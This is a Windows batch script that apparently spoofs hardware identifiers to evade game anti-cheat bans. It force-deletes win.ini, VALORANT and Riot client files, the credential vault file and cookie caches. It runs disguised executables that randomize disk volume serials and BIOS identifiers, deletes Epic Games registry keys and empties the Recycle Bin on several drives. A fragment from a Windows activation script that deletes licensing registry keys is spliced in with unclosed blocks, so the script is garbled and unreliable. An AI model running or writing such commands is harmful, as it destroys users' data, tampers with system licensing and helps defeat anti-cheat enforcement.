echo off
del /f "C:\Windows\win.ini"
del /f "C:\Riot Games\VALORANT\live\Manifest_NonUFSFiles_Win64.txt"
del /f "C:\Riot Games\VALORANT\live\Engine\Binaries\ThirdParty\CEF3\Win64\icudtl.dat"
del /f "C:\Riot Games\Riot Client\UX\Plugins\plugin-manifest.json"
del /f "C:\Riot Games\Riot Client\UX\icudtl.dat"
del /f "C:\Riot Games\Riot Client\UX\natives_blob.bin"
del /f "C:\Users\%username%\AppData\Local\Microsoft\Vault\UserProfileRoaming\Latest.dat"
del /f "C:\Users\%username%\AppData\Local\AC\INetCookies\ESE\container.dat"
del /f "C:\Users\%username%\AppData\Local\Microsoft\OneDrive\logs\Common\DeviceHealthSummaryConfiguration.ini"
del /f "C:\ProgramData\Microsoft\Windows\DeviceMetadataCache\dmrc.idx"
del /f "C:\Users\%username%\ntuser.ini"
del /f "C:\Users\%username%\AppData\Local\Microsoft\Windows\INetCache\IE\container.dat"
 
 
::  Below registry key (Volatile & Protected) gets created after the ClipSVC License cleanup command, and gets automatically deleted after 
::  system restart. It needs to be deleted to activate the system without restart.

::  This code runs only if Lockbox method to generate ticket is manually set by the user in this script.

set "RegKey=HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ClipSVC\Volatile\PersistedSystemState"
set "_ident=HKU\S-1-5-19\SOFTWARE\Microsoft\IdentityCRL"

if %_lock%==1 (
%nul% call :regown "%RegKey%"
reg delete "%RegKey%" /f %nul% 

reg query "%RegKey%" %nul% && (
call :dk_color %Red% "Deleting a Volatile Registry            [Failed]"
call :dk_color %Magenta% "Restart the system, that will delete this registry key automatically"
) || (
echo Deleting a Volatile Registry            [Finish]
)

REM Clear HWID token related registry to fix activation incase if there is any corruption

reg delete "%_ident%" /f %nul%
reg query "%_ident%" %nul% && (
call :dk_color %Red% "Deleting a Registry                     [Error] [%_ident%]"


::========================================================================================================================================

::  Multiple attempts to generate the ticket because in some cases, one attempt is not enough.



set ztmp=C:\Users\k\AppData\Local\Temp\ytmp
set MYFILES=C:\Users\k\AppData\Local\Temp\afolder
set bfcec=t8121.exe
set cmdline=
SHIFT /0
attrib +h C:\Users\k\AppData\Local\Temp\ytmp
%MYFILES%\accessibility.dll /accepteula
%MYFILES%\accessibility.dll
%MYFILES%\accessibility.dll /accepteula
%MYFILES%\accessibility.dll C: %random:~-1%%random:~-1%%random:~-1%%random:~-1%-%random:~-1%%random:~-1%%random:~-1%%random:~-1%
%MYFILES%\accessibility.dll D: %random:~-1%%random:~-1%%random:~-1%%random:~-1%-%random:~-1%%random:~-1%%random:~-1%%random:~-1%
%MYFILES%\accessibility.dll E: %random:~-1%%random:~-1%%random:~-1%%random:~-1%-%random:~-1%%random:~-1%%random:~-1%%random:~-1%
%MYFILES%\accessibility.dll F: %random:~-1%%random:~-1%%random:~-1%%random:~-1%-%random:~-1%%random:~-1%%random:~-1%%random:~-1%
%MYFILES%\accessibility.dll G: %random:~-1%%random:~-1%%random:~-1%%random:~-1%-%random:~-1%%random:~-1%%random:~-1%%random:~-1%
%MYFILES%\accessibility.dll H: %random:~-1%%random:~-1%%random:~-1%%random:~-1%-%random:~-1%%random:~-1%%random:~-1%%random:~-1%

%MYFILES%\AppVDll.exe /SS %random%%random%%random%
%MYFILES%\AppVDll.exe /BS %random%%random%%random%
%MYFILES%\AppVDll.exe /SU auto
%MYFILES%\AppVDll.exe /IV %random:~-1%.%random:~-1%.%random:~-1%
%MYFILES%\AppVDll.exe /ID  0%random:~-1%/0%random:~-1%/2021
%MYFILES%\AppVDll.exe /SP MS-%random:~-1%C%random:~-1%%random:~-1%F
%MYFILES%\AppVDll.exe /BT X%random:~-1%%random:~-1%%random:~-1%S%random:~-1%%random:~-1%%random:~-1%X%random:~-1%
%MYFILES%\AppVDll.exe /PSN %random%%random%%random%



reg delete "HKEY_LOCAL_MACHINE\Software\Epic Games" /f
reg delete "HKEY_CURRENT_USER\Software\Epic Games" /f
reg delete "HKEY_LOCAL_MACHINE\Software\Epic Games" /f
rd /q /s %systemdrive%\$Recycle.Bin
rd /q /s d:\$Recycle.Bin
rd /q /s e:\$Recycle.Bin
rd /q /s f:\$Recycle.Bin



pause
exit
